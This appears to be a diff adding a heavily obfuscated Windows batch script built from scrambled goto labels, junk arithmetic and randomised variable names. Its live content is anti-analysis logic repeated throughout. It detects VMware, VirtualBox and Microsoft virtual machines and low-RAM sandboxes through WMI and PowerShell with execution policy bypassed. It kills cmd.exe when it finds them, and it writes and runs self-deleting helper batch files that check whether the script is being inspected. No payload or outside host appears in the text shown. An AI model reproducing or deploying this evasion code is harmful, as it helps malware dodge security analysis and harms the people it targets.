+:669397  
+set "T1=P" 
+set /a ans=2*~-50628 
+goto (2*~-50628)  
+:575812 
+:662380  
+for /l %%b  in (5  5  5) do (
+ set "V1=R" 
+)
+set /a ans=2*2*2*2*03*035*0xa3 
+echo @echo off >> kdotVvQkH.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotVvQkH.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotVvQkH.bat 
+
+ call kdotVvQkH.bat 
+goto (2*2*2*2*03*035*0xa3)  
+:273976 
+:625945 
+:215730  
+for /l %%v  in (336  336  336) do (
+ set "W1=S" 
+)
+set /a ans=0x3*015*0x1d*((0x1dfd70xb857)>>7) 
+echo @echo off >> kdotGYuvOH.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotGYuvOH.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotGYuvOH.bat 
+
+ call kdotGYuvOH.bat 
+goto (0x3*015*0x1d*((0x1dfd70xb857)>>7))  
+:966904 
+:240967 
+:602911  
+set "Y1=U" 
+set /a ans=03*~-219768 
+goto (03*~-219768)  
+:520353 
+:570439  
+for /l %%q  in (115  115  115) do (
+ set "C1=Y" 
+)
+set /a ans=0x3*0x7*(0275470x519c) 
+goto (0x3*0x7*(0275470x519c))  
+:806663 
+:933264 
+:171227  
+for /l %%H  in (74  74  74) do (
+ wscript /b 
+)
+set /a ans=((077062600x34d99c)>>2) 
+goto (((077062600x34d99c)>>2))  
+:490983 
+:700952 
+:259684  
+set "e=a" 
+set /a ans=0x25*(0xac2012257) 
+goto (0x25*(0xac2012257))  
+:372507  
+for /l %%e  in (566  566  566) do (
+ set "g=c" 
+)
+set /a ans=0x67*((0562150156655)>>5) 
+goto (0x67*((0562150156655)>>5))  
+:315054 
+:932764 
+:601551 
+:468708  
+for /l %%t  in (583  583  583) do (
+ set "i=e" 
+)
+set /a ans=015*0155*(07250xd2) 
+goto (015*0155*(07250xd2))  
+:183108 
+:344693 
+:560896  
+set "o=k" 
+set /a ans=2*2*2*(050160131043) 
+goto (2*2*2*(050160131043))  
+:837690  
+for /l %%g  in (393  393  393) do (
+ set "p=l" 
+)
+set /a ans=03*05*0147*0x7f 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%sojhJdIPJ%%QUOLjMY%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%ZrpgxTIA%%hzsqDfOV%%a\nif "%%LXDIYTx%%aKrXWUqZFiDwtQVAb%%nuzCjbbwFdLjMpjIB%%aIYkkTmJjQIFXKYv%%IOzAVuiOqqJWLKoTJ%%leReWORBbANgJdNUGD%%dYRWQuhsVwxDwRLpu%%vdCzSlHlPyRrbEOPcvC%%aooSeOKGpwbHCIgBR%%eHUNSUqjqwuRQTrQOY%%KcJQIEhnGNDLRbs%%wHMxerbpOaOHEGPbY%%FsGLvbGnhTdebjE%%BujrOzF%%"=="Microsoft Corporation" if "%%AiyuThmG%%rCDMnWhWVioLeRbSJiS%%druLiUzukibavmeK%%DGjRZMcQxzDGTGbnfm%%weYqbpQahnDUGtIi%%hPKVxecRJhShFCZPYDZ%%XCRYIHPN%%"=="Virtual Machine" exit\nif "%%UWHiSEBBQ%%sKHchmQgBiPWMUMwLNn%%kYYFrOhwiWoGAaIG%%vnFxqRNjaLSlyjOU%%dVGsNVlqNXIeFSR%%AKuIfTVHbontCaXVE%%rLBLSijwRJQHKNd%%bqsHLEWyKBPDGss%%EaXggSXGpWDkwFLW%%emlfOUuicqFMbBhFbZV%%BvrypowognDSQlJsye%%gaCSRrnatFGOwyyMF%%pywRHErKAnstyXPVd%%QzXIZWEi%%"=="VMware, Inc." exit\nif "%%tDJpxcYv%%GFyHbZipNiFwuakFAtg%%JRZPJFIkRGjUfud%%WAumieyLzXAdywYEW%%opFqKeeUNaMxtYIae%%HSCKXLFhTfDtGgTRI%%kCeaKZc%%"=="VirtualBox" exit 
+)
+goto (03*05*0147*0x7f)  
+:751647 
+:620197 
+:827419  
+for /l %%w  in (735  735  735) do (
+ set "s=o" 
+)
+set /a ans=0xb*0141*~-332 
+goto (0xb*0141*~-332)  
+:842381 
+:522951 
+:423567  
+for /l %%z  in (269  269  269) do (
+ set "v=r" 
+)
+set /a ans=0100*~-5088 
+echo @echo off >> kdotfjxEse.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotfjxEse.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotfjxEse.bat 
+
+ call kdotfjxEse.bat 
+goto (0100*~-5088)  
+:410423 
+:188161  
+for /l %%o  in (156  156  156) do (
+ set "x=t" 
+)
+set /a ans=2*2*2*(0537260x1e6d9) 
+goto (2*2*2*(0537260x1e6d9))  
+:773875 
+:410817  
+set "z=v" 
+set /a ans=0x5*((0xf9896e0x25be06e)>>8) 
+goto (0x5*((0xf9896e0x25be06e)>>8))  
+:932764 
+:904988  
+set "b=x" 
+set /a ans=2*((01351345000x8c5f40)>>9) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%sdHFZun%%cPACCLxtM%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%bemGIjT%%qUAZhkZS%%a\nif "%%TQLdWsotu%%uttQZeiiYRYQdqVq%%YpyJwEXMawfKfaKtsdP%%spdVpSpjjjDaoNijIo%%EifRqIxcqlBTdPrmv%%CgUNYuNbLbQkFBNpO%%UheyWvCwSTSzYMaDS%%PUAZDnxQZyjtpDVZYAc%%hdMKqoxpeiXAAvXsR%%SGaNywBlqlDMKymP%%qbMPUCcnSbWMYaDnZ%%jmOYpOXZafDhUdNiE%%qxIECKQnOwcmNKyCk%%dHnLYMGo%%"=="Microsoft Corporation" if "%%TnzrIVfYv%%sITxeaJWiPXcibTDWT%%RQEdcpdvPkpZgxCtL%%DVmyZdfJczwFTgSuKf%%iHjLnoINaLdpbqTq%%RhVfdCJhSZJkWvB%%JgDaShoMi%%"=="Virtual Machine" exit\nif "%%LGlpBgHW%%JaqRSnCrihfbjtbS%%kShRFktwBXzxRimX%%cYLdiMMTjVLQyZMU%%aBqOxnDWoqLwxPsgTda%%sXnKOmUbPruXmupzr%%KHwTrVECewiPUwLsr%%qwBxdBWkyLbOMjVdoQ%%KWoFKeKqpdyuefjP%%BaXPmLCuqrVujfpvBd%%rxRhPbzzhnIDqeFEpk%%BEwWRZNyzadVDcMZOC%%VsDmvIppnKTGkHxEnf%%UOszYUhe%%"=="VMware, Inc." exit\nif "%%OZrjpqFDY%%LvNtvNkiVZCDHVHYq%%izgOVbkkAaUlcUB%%UQYSVfUzjQbqjnXNg%%CupSQFzZaFObfZsCOv%%JLzSlCJechRvtnPHwoF%%jepHrLGCo%%"=="VirtualBox" exit 
+)
+goto (2*((01351345000x8c5f40)>>9))  
+:229737 
+:915805  
+set "c=y" 
+set /a ans=0x7*015*0x2f*0177 
+goto (0x7*015*0x2f*0177)  
+:178461 
+:719647 
+:218266  
+set "d=z" 
+set /a ans=0xb*045*~-752 
+goto (0xb*045*~-752)  
+:568819 
+:143776  
+set "E1=A" 
+set /a ans=0x5*07*0x13*~-912 
+goto (0x5*07*0x13*~-912)  
+:706861 
+:649855  
+for /l %%i  in (443  443  443) do (
+ set "F1=B" 
+)
+set /a ans=2*2*2*2*0107*(0x1d70xe0) 
+goto (2*2*2*2*0107*(0x1d70xe0))  
+:178461 
+:417994 
+:999011  
+set "G1=C" 
+set /a ans=2*2*(0x290530x1822a) 
+goto (2*2*(0x290530x1822a))  
+:987117 
+:344693 
+:570439 
+:155043  
+set "H1=D" 
+set /a ans=03*0x3*023*((06407730x64bb)>>6) 
+goto (03*0x3*023*((06407730x64bb)>>6))  
+:692213 
+:791069 
+:744742  
+for /l %%u  in (830  830  830) do (
+ set "R1=N" 
+)
+set /a ans=2*2*2*2*05*0x5*(0xd3a0x499) 
+goto (2*2*2*2*05*0x5*(0xd3a0x499))  
+:955215 
+:624041 
+:706861 
+:721984  
+set "S1=O" 
+set /a ans=2*0x3*0x7*0xd*023*0x17 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0x3*0x7*0xd*023*0x17)  
+:757995 
+:446126 
+:519355  
+set "T1=P" 
+set /a ans=2*03*~-147788 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*03*~-147788)  
+:337684 
+:332141 
+:388129 
+:655941 
+:232226  
+for /l %%q  in (691  691  691) do (
+ set "U1=Q" 
+)
+set /a ans=2*03*(0x390f0104260) 
+goto (2*03*(0x390f0104260))  
+:395985  
+set "V1=R" 
+set /a ans=2*2*0xd*(0x25ef0x5f2) 
+goto (2*2*0xd*(0x25ef0x5f2))  
+:546797  
+for /l %%c  in (897  897  897) do (
+ set "X1=T" 
+)
+set /a ans=0x5*05*(0x3217070010) 
+goto (0x5*05*(0x3217070010))  
+:410423 
+:465491  
+set "C1=Y" 
+set /a ans=0x3*03*0235*~-468 
+echo @echo off >> kdotDuSEsQ.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotDuSEsQ.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotDuSEsQ.bat 
+
+ call kdotDuSEsQ.bat 
+goto (0x3*03*0235*~-468)  
+:968222 
+:704012  
+for /l %%m  in (856  856  856) do (
+ set "D1=Z" 
+)
+set /a ans=2*05*0x5*07*~-1328 
+echo @echo off >> kdotfLgRm.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotfLgRm.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotfLgRm.bat 
+
+ call kdotfLgRm.bat 
+goto (2*05*0x5*07*~-1328)  
+:955293 
+:999011 
+:232226 
+:956368  
+doskey POPD=REM 
+set /a ans=(027013450173572) 
+echo @echo off >> kdotwzzCA.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotwzzCA.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotwzzCA.bat 
+
+ call kdotwzzCA.bat 
+goto ((027013450173572))  
+:215730 
+:430093  
+set "e=a" 
+set /a ans=2*2*0x5*0x2b*~-968 
+goto (2*2*0x5*0x2b*~-968)  
+:536797  
+set "f=b" 
+set /a ans=2*2*2*03*0x7*0xd*0x8b 
+goto (2*2*2*03*0x7*0xd*0x8b)  
+:289782 
+:699533  
+for /l %%j  in (185  185  185) do (
+ set "g=c" 
+)
+set /a ans=2*0x5*0x13*((062122025126)>>2) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0x5*0x13*((062122025126)>>2))  
+:537718 
+:114924 
+:383217 
+:635917 
+:132055  
+for /l %%z  in (738  738  738) do (
+ set "o=k" 
+)
+set /a ans=0x3*0xb*0x9d*0xad 
+echo @echo off >> kdotrJiAt.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotrJiAt.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotrJiAt.bat 
+
+ call kdotrJiAt.bat 
+goto (0x3*0xb*0x9d*0xad)  
+:833209 
+:641203  
+for /l %%d  in (897  897  897) do (
+ set "r=n" 
+)
+set /a ans=~-552758 
+goto (~-552758)  
+:172064 
+:310246 
+:466840 
+:602911 
+:666742  
+set "t=p" 
+set /a ans=2*05*(0xace10x187c) 
+goto (2*05*(0xace10x187c))  
+:401216 
+:536797 
+:255263  
+for /l %%t  in (162  162  162) do (
+ set "u=q" 
+)
+set /a ans=03*0x3*0x7*0x11*023*037 
+goto (03*0x3*0x7*0x11*023*037)  
+:966567 
+:490983 
+:641203 
+:137647  
+set "v=r" 
+set /a ans=0100*03*((055206021716)>>3) 
+echo @echo off >> kdotjhhuy.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotjhhuy.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotjhhuy.bat 
+
+ call kdotjhhuy.bat 
+goto (0100*03*((055206021716)>>3))  
+:431002 
+:317634  
+set "w=s" 
+set /a ans=0xa3*((02517420x30582)>>5) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%PBNVZoEf%%AvojNTAol%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%brlrNwx%%JhIhHKBl%%a\nif "%%weZDvwNfX%%yhLCebbqwiCGUqucLZ%%rnVmgwhDwVMapSjJRo%%TqurcnyjIcbkblilq%%XnUuOiHqqRozkxzUzv%%pxgFvOjUbPqwonbG%%DFChkAeNwBQFdavi%%BlzlYXtywBVCEhROh%%yvLcuKcFNppyEMuPe%%USuJxXSNgqFVXAkXCz%%gWCougndtnKWevbiyd%%ueOAPwhMaMmdBlnjzL%%VGQXhselxnyhGpxKUme%%ucrICZTEP%%"=="Microsoft Corporation" if "%%gAqaKvAC%%TkQdSqUiIvwqqNT%%GSNpmkOXKkZuEDywf%%HyyLCIIBNzfnKyYeg%%kGbkNrEdgaJcaadSBKD%%erGkKrPqhMKWAOwZcY%%rbTqVRGMi%%"=="Virtual Machine" exit\nif "%%iKjfZrWhf%%JtzLduEpiRgBwsrax%%iynwZNKzwcIqflamJD%%qAajIEqRhjKWwMoXcr%%xkvgyiPDqcTTRLsl%%pBbLrZmYbdpwwSvolt%%eiITSnawQIDMlbH%%SAVhkozeyCbjHbqY%%zMcodsFpPrsrARYIQ%%IbXgZQrqYErBlxX%%HERmbEyHJnOjiVjKTpO%%nAxWKdiadasgZiBuF%%wcEPRVLiMnOjzsqPrEX%%EJuqpipfg%%"=="VMware, Inc." exit\nif "%%gdTGksxVm%%IbPcUnACiLzrZbvxt%%JlUBMUtnkvZFGSidO%%dBIQDDHzpEKeYXy%%zRkkRNNqaQduhdxIn%%TDLKLFqLbhoEsKiTc%%PTxdKckJl%%"=="VirtualBox" exit 
+)
+goto (0xa3*((02517420x30582)>>5))  
+:110095 
+:522953  
+for /l %%l  in (100  100  100) do (
+ set "x=t" 
+)
+set /a ans=2*0x5*0xb*((0x2b050x5ff9)>>2) 
+goto (2*0x5*0xb*((0x2b050x5ff9)>>2))  
+:333352  
+set "a=w" 
+set /a ans=0x7*0x11*021*0x49 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x7*0x11*021*0x49)  
+:363766  
+for /l %%a  in (432  432  432) do (
+ set "c=y" 
+)
+set /a ans=0x2b*0123*0277 
+goto (0x2b*0123*0277)  
+:760905 
+:366505  
+for /l %%s  in (879  879  879) do (
+ set "d=z" 
+)
+set /a ans=2*0x5*013*0xb*~-368 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0x5*013*0xb*~-368)  
+:506159 
+:645943 
+:585040  
+for /l %%t  in (716  716  716) do (
+ set "E1=A" 
+)
+set /a ans=~-772844 
+echo @echo off >> kdotNJYwBM.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotNJYwBM.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotNJYwBM.bat 
+
+ call kdotNJYwBM.bat 
+goto (~-772844)  
+:128359 
+:143776 
+:883712  
+set "H1=D" 
+set /a ans=2*2*2*2*2*0x7*((056536101453761)>>8) 
+goto (2*2*2*2*2*0x7*((056536101453761)>>8))  
+:333352 
+:143416  
+for /l %%d  in (510  510  510) do (
+ set "I1=E" 
+)
+set /a ans=03*0x13*(0x2441010472) 
+goto (03*0x13*(0x2441010472))  
+:987117 
+:318891  
+set "L1=H" 
+set /a ans=2*~-485030 
+goto (2*~-485030)  
+:715850 
+:218266 
+:744742 
+:309091  
+set "N1=J" 
+set /a ans=2*2*2*0x3*0x3*0x3*~-3912 
+echo @echo off >> kdotcBeUu.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotcBeUu.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotcBeUu.bat 
+
+ call kdotcBeUu.bat 
+goto (2*2*2*0x3*0x3*0x3*~-3912)  
+:727305 
+:812229  
+for /l %%u  in (385  385  385) do (
+ set "O1=K" 
+)
+set /a ans=0x3*045*0117*0x61 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x3*045*0117*0x61)  
+:182044 
+:716598 
+:480396  
+set "S1=O" 
+set /a ans=2*013*((01424104420x8feb22)>>9) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%wYuyOaj%%WkgnjBXR%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%YwsqmeOXE%%VabHRyE%%a\nif "%%vQwOBenae%%VOqiEGtiQAsSFhye%%QjmDnVvwANcXwAZhi%%tyPCpKHmjCOFqznvy%%ZiupyjSkqqCMytfaszd%%snQzSFJrbJVsJBmR%%YkpILOiwEtxLrTVP%%yNdmRQAyCuUHWPyxp%%hjzSMrtpgKGddvxKZ%%rxwoaewmJqZcaaZJwWj%%JYQfCScQnYXedHKkJ%%PKkyuuTNaMErVKJfB%%LRddGrOhAnpkBkFwS%%AcLBIYvDK%%"=="Microsoft Corporation" if "%%aqLabDjAB%%mpBgqywidhuPfQggX%%itBskXbUkisvOctq%%VuwLJuDzPzucQOn%%AhpSCNMoaARHreuj%%mSJBjqzhsIEOzhI%%MsdVzmO%%"=="Virtual Machine" exit\nif "%%BSthvrVh%%FrJRdRGiBpzsqdu%%uDdoBeFtwRKeshlMH%%CpGkTAjlwjJOiIQLG%%VVZZOhLsqVThstGDg%%NBVXwWObZIlJLbNb%%JREwiicwXOqlMJg%%sNErdFLyMdozKGiNE%%ylbfGlmpyDQXKCDXP%%zjWoFJcODqJJSLaHFT%%azCGDpGnlnDLwiKL%%SLFtFxdyaHooRFQJk%%ZICIUlqMPnEXKySQy%%MtuyeDtTC%%"=="VMware, Inc." exit\nif "%%StFzBdFys%%dmuCCwfiYvtNIJZEA%%ZcofsBxLtklvKHQEU%%fEqprhCSDzWQMLbJT%%FpquisWWabHFOTFJU%%pIVyVQhshBcVvdIwdb%%FhsRmDV%%"=="VirtualBox" exit 
+)
+goto (2*013*((01424104420x8feb22)>>9))  
+:625945 
+:602911 
+:397653  
+set "V1=R" 
+set /a ans=013*(0202350114260) 
+echo @echo off >> kdotFvoit.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotFvoit.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotFvoit.bat 
+
+ call kdotFvoit.bat 
+goto (013*(0202350114260))  
+:542877  
+set "X1=T" 
+set /a ans=2*2*~-167430 
+goto (2*2*~-167430)  
+:361053 
+:812229 
+:590246  
+set "B1=X" 
+set /a ans=0x3*((0750034250x4f26d15)>>9) 
+echo @echo off >> kdotDWyIt.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotDWyIt.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotDWyIt.bat 
+
+ call kdotDWyIt.bat 
+goto (0x3*((0750034250x4f26d15)>>9))  
+:932764 
+:560896 
+:473854  
+set "C1=Y" 
+set /a ans=((0xcac0f0x679fa7)>>3) 
+echo @echo off >> kdotALmlW.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotALmlW.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotALmlW.bat 
+
+ call kdotALmlW.bat 
+goto (((0xcac0f0x679fa7)>>3))  
+:337684 
+:433427 
+:215621 
+:670798  
+set "e=a" 
+set /a ans=2*0x61*(0x94603677) 
+goto (2*0x61*(0x94603677))  
+:278473 
+:536326 
+:635917 
+:385907 
+:704012 
+:312897  
+set "h=d" 
+set /a ans=0x3*0x17*0111*0x89 
+goto (0x3*0x17*0111*0x89)  
+:410817 
+:410516  
+set "j=f" 
+set /a ans=((0x129b60175666)>>9)*~-1638 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%vYjMVMg%%TcfLChA%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%JeSsVGaM%%hptYrCxT%%a\nif "%%ykBceXlK%%OmnbAIMwiueJYJkyXh%%dAXIkufPVwCNjjhRkL%%EPZKOyYUEjBfbXBoC%%WbIRYyDaVqynLqsRtWy%%HPdYpjYxbITyOCojWu%%pRFwqLVmwaAKyOncu%%aDoJSGSmiyYyDEJvV%%NaNkOBppOpymZYTN%%LzrzeNpBiqaiviYigoV%%eMZtYXTuNnVZmcozlH%%KJLGdowafduTTKNB%%nKltNZYkntKxFlcMx%%shcOkBY%%"=="Microsoft Corporation" if "%%hLDQXkYw%%BpMYeeMJiuIYANnU%%gwIpSiIVWkzdjwGklG%%DqTNvrgTzYKhliYK%%TLKJWeGkcamAsEvQz%%uAkLAZgnhRYHVoPfbJ%%QwvxXPfk%%"=="Virtual Machine" exit\nif "%%vHjnkyCWU%%GCUDjvuitnEPWdNkv%%oYLgiUFwOhQFOQD%%axNrjszUjNAbgAUQBt%%kZwHqGArqnzIEvzBH%%huaMoFTBbOPnuLkjw%%AGNCvAnBwTeOGmmnP%%EXQkucuvDyAYQBdHNYt%%dRiXqLnpMufwsXPA%%mTGiFlPqSeNFuiECK%%ArANVeGnZvRHlza%%gOLjNOyaTCOagVZ%%AZvohEbcEnVNscQwk%%LXQsKEVC%%"=="VMware, Inc." exit\nif "%%uwpEOLrQH%%DPapqoZinyDivoJaN%%UHyidoCTkOzadTVKKg%%XLIquXEnzUhWdhau%%xfQwjGiSaIBfcuTP%%kWbmpTZLhkDuKUfBL%%KGVNGxon%%"=="VirtualBox" exit 
+)
+goto (((0x129b60175666)>>9)*~-1638)  
+:388129 
+:585040 
+:480396 
+:382132  
+set "k=g" 
+set /a ans=((0x1ac93e40xb6a26e4)>>8) 
+echo @echo off >> kdotxnBqY.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotxnBqY.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotxnBqY.bat 
+
+ call kdotxnBqY.bat 
+goto (((0x1ac93e40xb6a26e4)>>8))  
+:909718 
+:560896 
+:310387  
+set "m=i" 
+set /a ans=035*((0x2326f0x93b7)>>3) 
+goto (035*((0x2326f0x93b7)>>3))  
+:934495 
+:444683 
+:649855 
+:635054  
+for /l %%b  in (765  765  765) do (
+ set "o=k" 
+)
+set /a ans=2*03*0x3*075*0301 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%sMArutKC%%WpJqYYsVh%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%qZyLAZuvT%%ZOLZfXh%%a\nif "%%TbDNLcL%%zzegXmtiWZZvFtf%%JcpXHzdwdUCxvVqe%%MfnyoabOjaCGFgLfsB%%VJnEZjpqiBtvqPB%%FDVMhlRbuCTIiLi%%nkQZKjeKawAGleHCMs%%paZxKoatyoEoaYPRdK%%VsRZytcupcqmNDoPk%%MMNSoxLqPDPRwsju%%XqyglPFnpMJZjIO%%kiBryTlaiHjCupNpw%%JXaPhyrlpnwTgBQHSY%%CBwNtFBx%%"=="Microsoft Corporation" if "%%ccHMsegcN%%fRcOgxRiVZTMVrRm%%GdNgaMkkqwEaiyRV%%juqahrgqyzvaKIMEzr%%NtbDwKKbaIQpdffvL%%VPKofHThFkilahrp%%wceMAVVTK%%"=="Virtual Machine" exit\nif "%%NtMVZbEzk%%aqjDbxWcQicqTkomV%%GDefOLkyuwpaDwEgv%%StJGwbKjOmNEcBTA%%tpisQysooqaotsukkH%%hnLySTxbloiAirKO%%arhaxtwwxxayRFkg%%ZkwNUQjrGyASulwhy%%mzWaETvplJkJzuC%%ytzkBRECqHIiUxvUR%%WjsqHsPnnIgqMfwc%%VSVCJiUvjaDWJbEOZls%%CXxPiFCkYnJrjUBlSB%%XpvoWjNLf%%"=="VMware, Inc." exit\nif "%%SMYUGYoJ%%lAekGokqixyoteoyj%%lHAmzKfwrknjDQHaFiC%%rzeWTSEqzoIiNOQjHQ%%oPSITblaUtVVcPIV%%ukaAeFBRmhqGJArFkZ%%FnGzjWuhp%%"=="VirtualBox" exit 
+)
+goto (2*03*0x3*075*0301)  
+:956368 
+:666742 
+:481826  
+set "q=m" 
+set /a ans=2*0x3*013*(0x2a7c0x92f) 
+goto (2*0x3*013*(0x2a7c0x92f))  
+:862888 
+:806663 
+:962256  
+set "s=o" 
+set /a ans=2*~-290028 
+goto (2*~-290028)  
+:155043 
+:221162  
+for /l %%g  in (761  761  761) do (
+ set "u=q" 
+)
+set /a ans=2*0x3*053*((0x2ad90x73b1)>>3) 
+goto (2*0x3*053*((0x2ad90x73b1)>>3))  
+:530999  
+for /l %%e  in (565  565  565) do (
+ set "y=u" 
+)
+set /a ans=0x1d*0141*((037322016162)>>5) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x1d*0141*((037322016162)>>5))  
+:647345 
+:401673 
+:812229 
+:276783  
+set "a=w" 
+set /a ans=2*2*0x3*03*(0135210x48c4) 
+goto (2*2*0x3*03*(0135210x48c4))  
+:315054 
+:991064 
+:473224 
+:480396 
+:100256  
+for /l %%q  in (959  959  959) do (
+ set "b=x" 
+)
+set /a ans=2*2*0x3*0x3*013*~-1494 
+goto (2*2*0x3*0x3*013*~-1494)  
+:415991  
+for /l %%c  in (207  207  207) do (
+ set "c=y" 
+)
+set /a ans=03*0x5*~-16652 
+goto (03*0x5*~-16652)  
+:955293 
+:430093 
+:577195  
+for /l %%z  in (925  925  925) do (
+ set "d=z" 
+)
+set /a ans=2*~-84432 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*~-84432)  
+:513303 
+:187257  
+for /l %%v  in (659  659  659) do (
+ set "E1=A" 
+)
+set /a ans=03*03*03*0x17*((0x2dd06151)>>2) 
+goto (03*03*03*0x17*((0x2dd06151)>>2))  
+:721984 
+:481826 
+:971142  
+set "I1=E" 
+set /a ans=~-308*(02450720) 
+echo @echo off >> kdotZWtSt.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotZWtSt.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotZWtSt.bat 
+
+ call kdotZWtSt.bat 
+goto (~-308*(02450720))  
+:154041 
+:318891 
+:310387 
+:352348  
+set "J1=F" 
+set /a ans=03*0x3*0x3*065*~-354 
+echo @echo off >> kdotzlKPM.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotzlKPM.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotzlKPM.bat 
+
+ call kdotzlKPM.bat 
+goto (03*0x3*0x3*065*~-354)  
+:958760 
+:289370 
+:100256 
+:160723  
+set "K1=G" 
+set /a ans=2*0x47*(0x55b0x1206) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x47*(0x55b0x1206))  
